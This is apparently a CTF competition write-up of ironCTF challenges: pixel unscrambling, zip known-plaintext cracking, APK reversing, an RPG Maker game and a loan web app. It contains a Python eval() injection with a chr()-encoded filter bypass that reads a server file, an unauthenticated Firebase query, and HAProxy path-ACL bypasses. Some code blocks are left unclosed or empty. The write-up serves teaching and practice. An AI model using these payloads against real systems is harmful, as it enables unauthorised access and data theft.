Hello CTFers. This was another great CTF conducted by a accomplice of mine. `Team 1nf1n1ty` conducted a banger of a CTF, that had great challenges amongst others. We, `H7Tex` placed 50th out of 1033 teams. Even though, I couldn’t contribute much during CTF as I was travelling, l hope to make write-ups for almost all challenges.

## Forensics

### **Random Pixels**

My Image accidently fell into a pixel mixer can you help me recover it?

**Author:** `OwlH4x`

Given: `chal.zip`

```bash
└─$ unzip chal.zip
Archive:  chal.zip
  inflating: enc.py
  inflating: encrypted.png
```

Unzipping the zip, we get 2 files.

```bash
import random, time, numpy
from PIL import Image
from secret import FLAG

def randomize(img, seed):
        random.seed(seed)
        new_y = list(range(img.shape[0]))
        new_x = list(range(img.shape[1]))
        random.shuffle(new_y)
        random.shuffle(new_x)

        new = numpy.empty_like(img)
        for i, y in enumerate(new_y):
                for j, x in enumerate(new_x):
                        new[i][j] = img[y][x]
        return numpy.array(new)

if __name__ == "__main__":
        with Image.open(FLAG) as f:
                img = numpy.array(f)
                out = randomize(img, int(time.time()))
                image = Image.fromarray(out)
                image.save("encrypted.png")
```

![1](../assets/posts/ironCTF/1.png)

At first glance this seems like the PNG file has been scrambled with the `randomize()` function. In depth, what happens is, the code scrambles an image using a pseudo-random number generator (PRNG) seeded by the current UNIX timestamp using `int(time.time())`. The image is randomized by shuffling its pixel positions, which makes the output look like random noise. However, this method is vulnerable because the seed used for shuffling is based on the UNIX timestamp, which can be recovered using metadata.
Also, when we look at the encryption script, 

- The image is loaded and its pixels are scrambled based on two lists (`new_x` and `new_y`) generated by shuffling the x and y coordinates.
- The shuffle is deterministic as it relies on `random.seed(seed)`. Therefore, if you know the seed, you can reverse the process by performing the same shuffle in reverse.

Cool thing is that, we can find the seed of the image by looking at the times of the encrypted PNG, from `exiftool`. I did a similar challenge for H7CTF, this is cool to see.

```bash
└─$ exiftool encrypted.png

```

Let’s take the time from `File Modification Date/Time`which is `2024:10:03 02:32:40+05:30`[+5:30 is not required, as it’s just giving it in IST], as it mentions the time when the image was modified, so a good place to start. Convert the date to a timestamp with some online epoch convertor tool as follows.

[Epoch Converter](https://www.epochconverter.com/)

![2](../assets/posts/ironCTF/2.png)

Therefore, the UNIX timestamp at hand is `1727902960`, using that as the seed to reverse the process. 

```bash
import random, numpy
from PIL import Image

def randomize(img, seed):
    random.seed(seed)

    orig_y = list(range(img.shape[0]))
    orig_x = list(range(img.shape[1]))
    random.shuffle(orig_y)
    random.shuffle(orig_x)

    original = numpy.empty_like(img)

    for i, y in enumerate(orig_y):
        for j, x in enumerate(orig_x):
            original[y][x] = img[i][j]

    return original

if __name__ == "__main__":

    path = "encrypted.png"
    encImage = Image.open(path)
    encArray = numpy.array(encImage)

    seed = 1727902960
    
    revImageArray = randomize(encArray, seed)
    revImage = Image.fromarray(revImageArray)
    revImage.save("flag.png")
    print("Process Done!")
```

After running, the script we get a QR! Then we use a tool called `zbarimg`, which scans and decodes bar codes from image file right in the CLI.

```bash
└─$ zbarimg flag.png
QR-Code:ironCTF{p53ud0_r4nd0m_f0r_4_r3450n}
scanned 1 barcode symbols from 1 images in 0.04 seconds
```

Flag: `ironCTF{p53ud0_r4nd0m_f0r_4_r3450n}`

### **Game of Hunt**

A Cryptic Voyage

**Author**: `tasarmays`

Given: `upsidedown.txt`

We are given a huge binary file, opening it in `cyberchef`, and decrypting it from binary, we see it makes somewhat of like a directory listing, and further converting it to hex [I found this after some trial and error], we see the last section of the data end with, `04 03 4b 50`, which is the reverse of a zip file format. 

<img src="/assets/posts/ironCTF/3.png" alt="p4" width="65%"/>

When we try to unzip the file, it gives out an error.

```bash
└─$ unzip download.zip
Archive:  download.zip
error [download.zip]:  missing 20957899 bytes in zipfile
  (attempting to process anyway)
error [download.zip]:  start of central directory not found;
  zipfile corrupt.
  (please check that you have transferred or created the zipfile in the
  appropriate BINARY mode and that you have compiled UnZip properly)
```

using `—fixfix` tag to try and fix the file.

```bash
└─$ zip --fixfix download.zip --out fixed.zip
Fix archive (-FF) - salvage what can
 Found end record (EOCDR) - says expect single disk archive
Scanning for entries...
 copying:   (0 bytes)
 copying:   (3273347146 bytes)
```

But this didn’t work as well, and I was stuck here for a while, until I switched the mode to bytes from character in reverse, cause character reversing usually takes place in a text file, for files reversing, bytes is more common. After unzipping, we find a lot of PDF files, and sorting by size, we see a PDF with a different size [7 KB].

![4](../assets/posts/ironCTF/4.png)

Then, we extract the text from the PDF. We notice that it’s `BrainFuck`.

```bash
└─$ pdf2txt download/ilovepdfs/document_83.pdf > output.txt

┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/ironCTF/forensics/gameHunt]

Decoding that we get the flag.

### **Uncrackable Zip**

I forgot to ask my friend for the password to access the secret webpage, and now he's unavailable. I've tried guessing the password, but it's been unsuccessful. My friend is very security-conscious, so he wouldn't use an easy-to-guess password. He's also an Emmet enthusiast who relies heavily on code generation shortcuts. Can you help me figure out how to access the secret webpage?

**Author**: `AbdulHaq`

Given: `website.zip`

Initially, you try to bruteforce the zip with all kinds of wordlists, to which the zip file doesn’t even budge. Then we read the description carefully, we see that the friend like `emmet`, which is a **toolkit for web-developers, that allow you to store and re-use commonly used code chunks.**

Reading the documentation and all that, even before that, we know that the HTML files start with the OG syntax, and since we know some starting bytes of the plaintext, we can implement a known-plaintext attack on the zip file. For this we can bring out a legendary tool called `bkcrack`.

[bkcrack](https://github.com/kimci86/bkcrack)

```bash
└─$ ./bkcrack -L website.zip
bkcrack 1.7.0 - 2024-05-26
Archive: website.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       7a0a2e19          274          286 index.html
```

We see that it uses the `ZipCrypto` encryption and the `Store` compressions. Important things to note.

<aside>
💡

To run the attack, we must guess at least 12 bytes of plaintext. On average, the more plaintext we guess, the faster the attack will be.

</aside>

Now, we can create a duplicate `index.html` with about 12 bytes or more of a known plaintext, which we know from the hints in the description. 

[Emmet Cheat Sheet](https://docs.emmet.io/cheat-sheet/)

We use the following known plaintext.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
```

Also, here’s a guide on this that we can refer to.

[bkcrack](https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md)

Now, we can zip this index.html file with the appropriate encryption and compression techniques, essentially, matching the one in the encrypted zip file.

```bash
zip -r -e -P "1" -0 index.zip index.html
```

This command creates a ZIP file (`index.zip`) containing the file `index.html`. The contents of `index.html` are not compressed [`Store`] (because of the `-0` flag) and are encrypted with the password `"1"` using **ZipCrypto**.

Had some issues in cracking the zip with the same procedure. Was stuck here for a while. Then while looking at the hex bytes of the plaintext `index.html`.

```html
└─$ xxd index.html
00000000: 3c21 444f 4354 5950 4520 6874 6d6c 3e0a  <!DOCTYPE html>.
00000010: 3c68 746d 6c20 6c61 6e67 3d22 656e 223e  <html lang="en">
00000020: 0a3c 6865 6164 3e0a 2020 2020 3c6d 6574  .<head>.    <met
00000030: 6120 6368 6172 7365 743d 2255 5446 2d38  a charset="UTF-8
00000040: 223e 0a
```

We can see that it uses the `LF` terminator. Now time for some googling.

<aside>
💡

Known-plaintext attacks (like the one used by `bkcrack`) rely on an exact match between the plaintext (known content) and the corresponding encrypted data in the ZIP file. If the line endings of your plaintext don't match those of the file stored in the ZIP archive, the attack will fail because the data won’t align byte-for-byte. When the file was originally created or zipped, it might have been generated on a Windows system or with tools that use CRLF for line terminators, meaning each line ends with `\r\n` rather than just `\n`. The ZIP file stores these line terminators as part of the file’s content, so your plaintext must have CRLF line endings to match what is in the encrypted ZIP file.

</aside>

Changing `LF` into `CRLF` [**Carriage Return and Line Feed**, which are special characters used to indicate the end of a line in text files and other software code] 

- **LF (`\n`, 0x0A)**: The Unix/Linux standard for line endings.
- **CRLF (`\r\n`, 0x0D 0x0A)**: The Windows standard for line endings.

```

Making sure, it’s all good in the encryption [`ZipCrypto`] and the compression [`Store`] parts. Now, we run again.

### Air Message

what a noisy audio file, probably nothing useful... Wrap your flag in the format ironCTF{...}

**Author**: `OwlH4x`

Hint: The output file is a 8bit mono PCM wav file

Given: `out.wav`

At first glance, almost all would have figured out there was a `morse` hidden in the file. I used this tool that `@lans` recommended after the event.

[morse-analyzer](https://github.com/spaceymonk/morse-analyzer)

Running the `morse-analyzer.exe` on the file. It really did spit out the `morse` LOL.

![6](../assets/posts/ironCTF/6.png)

Then, we just use a `morse` decoder to finish off the job. But really I think the indented method might be to clean up the WAV file, do some tweaking's on the pitch, hertz and whatnot.

### **8-ball Game**

An 8-ball pool player has planned a strategy for the next three quarters match. I would like to know what the strategy is. Can you help me find out?

Given: [One Drive](https://1drv.ms/u/s!AjJTc9OQtSbRc6KlrEiowN8WZfA?e=a2VoE0)

We see a huge `disk.tar` file for about 990MB. Extracting that we get a `disk.001` file, which turns out to be a boot sector image.

```bash
└─$ file disk.001
disk.001: DOS/MBR boot sector, code offset 0x52+2, OEM-ID "NTFS    ", sectors/cluster 8, Media descriptor 0xf8, sectors/track 63, heads 255, hidden sectors 523479040, dos < 4.0 BootSector (0x80), FAT (1Y bit by descriptor); NTFS, sectors/track 63, sectors 2027519, $MFT start cluster 84480, $MFTMirror start cluster 2, bytes/RecordSegment 2^(-1*246), clusters/index block 1, serial number 08c108c72108c64d4; contains bootstrap BOOTMGR
```

Mounting the file we see lot of a loop holes to fall into.

```bash
sudo mount -o loop,ro disk.001 /mnt/8/
```

Now, I’ll refer `@q4say` - only person to blood and solve this challenge. Full credits to him.

Diving into `Documents\flag`, we see a lot of PNG pieces.

```bash

Here’s a script written by `@q4say` to piece them all together.

```bash
 mkdir out

 do
    convert piece_{1..40}_${i}.png -append out/output_${i}.png
 done
cd out
 for i in $(seq 1 40);
 do
    convert output_${i}.png -rotate 90 r90/90_output_${i}.png
 done
 cd r90
 convert 90_output_{1..40}.png -append final.png
```

Seems like, this was another loop hole LOL.

Other one to note, is under `/Documents/fff`

```bash

We see, it’s a Justin Bieber song, then we dive into `hitsong.wav`, there seems to a be a lot of highs and lows in the spectrogram of the audio file. Binary data.

Here is a still from `@q4say`'s write-up.

Now, we see a lot of odd `-` at random places. When analyzing more carefully, we need `dots(.)` `dashes(-)` and line-breaks represent spaces. Now time to extract.

### Fire in the Base Camp

I was playing with the dice when I heard about the fire in the base camp. Can you get there on time?

**Author**: `p3rplex3d`

Given: `Fire_in_the_Base_Camp.apk`

```bash
└─$ file Fire_in_the_Base_Camp.apk
Fire_in_the_Base_Camp.apk: Android package (APK), with gradle app-metadata.properties
```

In new territory here, Android here I come. Let’s decompile the APK with `apktool`.

```bash
└─$ apktool d Fire_in_the_Base_Camp.apk -o output

<aside>
💡

This is a Firebase Realtime Database URL. It's used for storing and syncing data across apps in real-time. 

</aside>

We can try to attempt to query `fburl`, the Firebase database for any relevant information. If there are no authentication barriers, data may be accessible. Let’s use `curl` to do the job.

```bash
curl 'https://app3-7d107-default-rtdb.firebaseio.com/.json'
```

The `.json` at the end is required for Firebase Realtime Database REST API queries, as it returns the data in JSON format. And that does the job.

```bash

### Secure Vault

Can you log in?

**Author**: `p3rplex3d`

Given: `secure_vault.apk`

```bash
└─$ file secure_vault.apk
secure_vault.apk: Android package (APK), with zipflinger virtual entry
```

<aside>
💡

This APK uses a relatively new Android packaging technique that involves **Zipflinger**.

**Zipflinger** is a tool integrated into the Android Gradle Plugin to improve APK build performance by speeding up the process of creating and updating ZIP files (such as APKs).

A "virtual entry" in this context likely means that Zipflinger optimizes how files are stored in the APK, reducing duplication and allowing faster file access without actually unpacking them fully. This virtual entry might not be a "physical" file in the APK but rather a reference to resources.

</aside>

And we see a Flutter APK. So we come across a new tool called `blutter`.

[Blutter](https://github.com/worawit/blutter)

<aside>
💡

Blutter is a Flutter Mobile Application Reverse Engineering Tool

</aside>

And it also seems like I don’t have Flutter installed as well. Another thing I was impressed about `blutter`, is the following fact.

The `blutter.py` will automatically detect the Dart version from the flutter engine and call executable of `blutter` to get the information from `libapp.so`. This is cool.

```bash

Done. This took like solid 8 minutes. After that, you just browse into `/asm/adminvault/main.dart` and amongst a couple of fake flags, extract a base64 string to get the real one.

```bash
// 0x279618: r16 = Instance_Base64Codec
    //     0x279618: ldr             x16, [PP, #0x1460]  ; [pp+0x1460] Obj!Base64Codec@47da51
    // 0x27961c: r30 = "aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0="
    //     0x27961c: add             lr, PP, #0xa, lsl #12  ; [pp+0xaf28] "aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0="
    //     0x279620: ldr             lr, [lr, #0xf28]
    // 0x279624: stp             lr, x16, [SP]

    //     0x279628: bl              #0x27aad0  ; [dart:convert] Base64Codec::decode
```

Now, simple decoding. This is so fun.

```bash
└─$ echo "aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=" | base64 -d

### Is This Android

I built this calculator for my Computer Science Project and my professor was baffled because there is more it than meet's the eye.

**Authors**: `AbdulHaq` & `p3rplex3d`

Given: `Calculator.apk`

```bash
└─$ file Calculator.apk
Calculator.apk: Android package (APK), with zipflinger virtual entry
```

Seems like this is an another Flutter application. Let’s bring in `blutter` one more time.

```bash
└─$ python3 ../../../Resources/blutter/blutter.py lib/arm64-v8a/ arm64Output
```

That took 9 minutes. Under `/asm/ctf_app1`, we find the main sources. And under `calc.dart`, which seems to be the actual source behind the calculator application. We find a hard-coded URL. Shout-out to `@FrontS` on Discord for guiding me.

![15](../assets/posts/ironCTF/15.png)

`https://calc.1nf1n1ty.team/calculate`

Trying to GET request the site.

```bash
└─$ curl -X GET https://calc.1nf1n1ty.team/calculate
/home/user/app.py
```

Sort of gives us the directory listing of the file. Nothing much here. Let’s try POST.

```bash
└─$ curl -X POST https://calc.1nf1n1ty.team/calculate
<!doctype html>
<html lang="en">
<title>415 Unsupported Media Type</title>
<h1>Unsupported Media Type</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8d07b9cf6c893e30',t:'MTcyODU3NTAwNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
```

Oh something different, let’s open that on `burp`.

Sending the POST request on `burp`, we still get that unsupported media type error.

![16](../assets/posts/ironCTF/16.png)

After spending some more time in figuring out what type of input the server accepts, I come across a string, couple of blocks below the URL.

![17](../assets/posts/ironCTF/17.png)

`expression`, seems like we can pass input with this string. But I have no idea how or where to use this input header. Also I found this endpoint, no idea what’s it for.

![18](../assets/posts/ironCTF/18.png)

Oh shoot, that's a `Cloudflare` use case. LOL.

<aside>
💡

Cloudflare adds a /cdn-cgi/ endpoint ( www.example.com/cdn-cgi/ ) to that domain. This endpoint is managed and served by Cloudflare. It cannot be modified or customized.

</aside>

Ah, there’s always the CLI and `curl` to turn back to. Since this is a python server, and probably uses the `eval()` for the calculator application, let’s try and read the flag with the payload. `open('/flag.txt').read()`

Quite simple, except that it didn’t work.

<aside>
💡

`H "Content-Type: application/json"`: This header specifies that the data being sent is in JSON format. The server uses this information to correctly parse the incoming request body.

`d '{"expression": "open('/flag.txt').read()"}'`: This is the data being sent in the request body. It's a JSON object with a single key-value pair:

</aside>

```bash
└─$ curl -X POST https://calc.1nf1n1ty.team/calculate -H "Content-Type: application/json" -d '{"expression": "open('/flag.txt').read()"}'
{"result":"unsafe to execute g not allowed"}
```

Well, that got blocked, now looking for other types of payload to bypass this filter. This happened.

`open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()`

Basically, the idea is to bypass the filter by convert the characters of the payload to it’s ASCII codes and execute it on the server side as normal characters. And that worked. Yessir!

```bash
└─$ curl -X POST https://calc.1nf1n1ty.team/calculate -H "Content-Type: application/json" -d '{"expression": "open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()"}'
{"result":"ironCTF{aa4a7a86d4beb072c814af4400c7d1fbf09cf9b5}"}
```

Flag: `ironCTF{aa4a7a86d4beb072c814af4400c7d1fbf09cf9b5}`

Here’s `FrontS` write-up for the challenge.

```bash
Seeing the apk was created using Flutter, I decided to disassemble it using blutter. 
In the disassembled code, it's possible to see that the app seemed to have a 
hardcoded URL within.
In the source, a POST request with json content type was being created with the 
key of "expression" to be sent to https://calc.1nf1n1ty.team/calculate
Making a GET request to https://calc.1nf1n1ty.team/calculate 
reveals the application's source code location being "/home/user/app.py".
However I wasn't able to find any use of it.
Crafting a POST request exactly as the code mentions, it's possible to see that 
the value to the "expression" you provide, i.e {"expression":"5*5"} results in 25, 
essentially calculating it. 
However, after debugging it a bit, it's possible to deduce that we are within a 
python application which probably used eval(), though there was a very 
constraining blacklist: no unicode chars allowed except numbers and mathematical operators. 
To bypass this, it's feasible to use unicode characters that would get interpreted as their ascii counterparts in python. 
A little bit guessing and experience from other challenges made me think that 
the flag would be located at /flag.txt, which eventually turned out to be right, 
so our objective is to use a payload like open('/flag.txt').read(). 
With this payload in mind, even if I convert it to unicode characters, 
quotes and slash seem to be a problem. Whichever different unicode variant 
of those two I tried, python didn't like them so it's time to think of something else.
In python, the easiest way I could think of was by using chr(num), 
which does not require neither slash nor quotes. 
And since + is a mathematical operator which was not blacklisted, 
it was possible to add chr(num)'s by combining them with + to create '/flag.txt'.
The final payload came to be this:
𝕠𝕡𝕖𝕟(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).𝕣𝕖𝕒𝕕()
```

## Game Hacking

Now let’s dive into yet another new territory. It got me all feelings.

![19](../assets/posts/ironCTF/19.png)

### **gotta hack em all**

Find the all parts of flag by hacking this.

ironCTF{Combine all flag parts}

**Author:** `AbdulHaq`

Given: `hack-em-all.zip`

Using `zipinfo`, we see a lot of musical files [`.mid` & `.ogg`]. Anyways, we see `Game.exe` and run it. Woah, an actual game loads up ! 

![20](../assets/posts/ironCTF/20.png)

This is so cool. Oh my goodness.

![21](../assets/posts/ironCTF/21.png)

While playing the game, we find out the task it to meet the gentlemen and get a cup of tea from him, catch is that the entire plot is blocked by the grass barrier. 

![22](../assets/posts/ironCTF/22.png)

Here is the chef outside the grass barrier.

![23](../assets/posts/ironCTF/23.png)

Well, there was no visible or fair way to meet the chef, so we resort to hack it. We use a tool, `RPGMakerDecrypter`, which is a tool for extracting RPG Maker XP, VX and VX Ace encrypted archives.

[RPGMakerDecrypter](https://github.com/uuksu/RPGMakerDecrypter)

But before that.

![24](../assets/posts/ironCTF/24.png)

You see this `Game.rgssad` file, that is the one we targeting. It contains all the juicy information.

<aside>
💡

RGSSAD is an encrypted archive file in a binary format created by RPG Maker VX. It also contains the visual data and graphic files for the game.

</aside>

We also need the RPG Maker software. 

[Downloads And Free Trials | RPG Maker | Make Your Own Game!](https://www.rpgmakerweb.com/downloads)

![25](../assets/posts/ironCTF/25.png)

This is the one I downloaded. Please don’t ask me why LOL. 

Note: Run the `RPGVX_E.exe` as administrator. 

Unfortunately, we need a `.vsproj` file, that is required by the RPG maker, but we don’t have one. So, we look for other ways.

With little hope left, I turn to Discord for answers, and answers they gave.  Shout-out to `@actors` and `@Adya` and all other fellow CTFers.

You actually had to install the RPG Maker XP. Here is the reasoning from `@actors`.

<aside>
💡

I looked up the extension name `.rgssad` and from there you can start narrowing it down to the correct software. Incidentally, I knew that I could try to decrypt/uncompressing that RPG maker file. which was far more easier and less time consuming than actually hacking the game.(unless you consider the decryptor as hacking it lol ) so there are some ways to go about it. 
You can also load it in IDA Pro and see the function names hint to be a RPG maker game, though that isnt what I would recommend doing for these types of challs.

</aside>

![26](../assets/posts/ironCTF/26.png)

Once, you install the whole Maker thing, copy the contents of both the initial challenge files and the files extracted from the Decryptor. Here are the contents of the game directory.

![27](../assets/posts/ironCTF/27.png)

After all that, press `F12` to compile and run the game.

![28](../assets/posts/ironCTF/28.png)

Then, you might see the new `Debug` option, which is cool. Now, you know you’re in it for real.

![29](../assets/posts/ironCTF/29.png)

You can play around with the Debug option, for instance here I made it snow.

![30](../assets/posts/ironCTF/30.png)

After a while, I pinged the author about this, we don’t me there’s another way to solve it, but I’m pretty sure that someone skilled can do it this way. 

So in the the `/Data` folder that the `RPGMakerDecryptor` made, two files apparently had the flags in parts.

`Map042.rxdata` and `items.dat`.

Note: `ironCTF{Part 1 + Part 3 + Final Part}`

Under `items.dat`

```
Part1 of the challenge flag is 840c77995d which will motivate you to find the whole flag.
```

Under `Map042.rxdata`

```bash
Granny Hazel: "Oh my stars, you actually did it! You've got quite the knack for this, 
don't you? Here's the third part of the flag";i;ijo;
["'pbAddForeignPokemon(:SHUCKLE, 20, ;i;ico;["&_I("aaaaa"), _I("d886cac6f9")
```

```bash
Granny Hazel: "Oh, you've done it, dear! You've opened the suitcase! I'm ever so grateful.
 Here's the final part of the flag as promised. You've been such a great ;i;ijo;["
help!";i;i�o;[")pbAddForeignPokemon(:BULBASAUR, 20, ;i;ico

```

## Web

### **Loan App**

UH! i keep getting rejected by my loan manager! I wish there was a way to approve it myself 😉

Author: `Vigneswar`

Given: `app.zip`

[loanapp](https://loanapp.1nf1n1ty.team/)

Both the username and passwords had to be valid UUIDs in order to register/login.

```
└─$ python3

>>> abu123 = uuid.uuid4()
>>> print(abu123)
2cc9ca8a-4695-43fb-8dbd-b799c06a258c
```

After checking the source, we find this interesting part.

```python
@app.route('/admin/loan/<loan_id>', methods=['POST'])
def admin_approve_loan(loan_id):
    try:
        mongo.db.loan.update_one({'_id': ObjectId(loan_id)}, {'$set': {'status': 'approved', 'message': FLAG}})
        return 'OK', 200
    except:
        return 'Internal Server Error', 500
```

Where the server connects to the endpoint `/admin/loan/<loan_id>` , but of course we hit a 403. Can’t be that easy HAHA. Also another thing I noticed is they used `HAProxy` for this web application, which I thought was an upgrade to our set-up, so that was in the back of my mind. 

<aside>
💡

HAProxy (High Availability Proxy) is a powerful open-source software that serves as a load balancer and proxy server for TCP and HTTP-based applications

</aside>

Checking out the `haproxy.cfg`.

```
acl is_admin path_beg /admin
http-request deny if is_admin
```

- **acl is_admin path_beg /admin**: Creates an access control list (ACL) named `is_admin` that matches requests where the path begins with `/admin`.
- **http-request deny if is_admin**: Denies requests that match the `is_admin` ACL, effectively blocking access to any URLs starting with `/admin`.

As expected, it blocks all the URL requests starting with `/admin`. Another interesting file to check out is the `docker-compose.yml`, that’s where we can also see the layout and executions including versions of the software in the web application.

```docker
loanapp-haproxy:
    image: haproxy:2.3.5
```

Now, we see it’s an older version of HAProxy, and there is a known vulnerability for it.

[Critical Vulnerability in HAProxy (CVE-2021-40346): Integer Overflow Enables HTTP Smuggling](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)

So actually, this was the intended method to solve it, integer overflowing the server to bypass HAProxy restrictions, but were a lot of unintended here, like `/%61dmin` or `//admin` and so on.
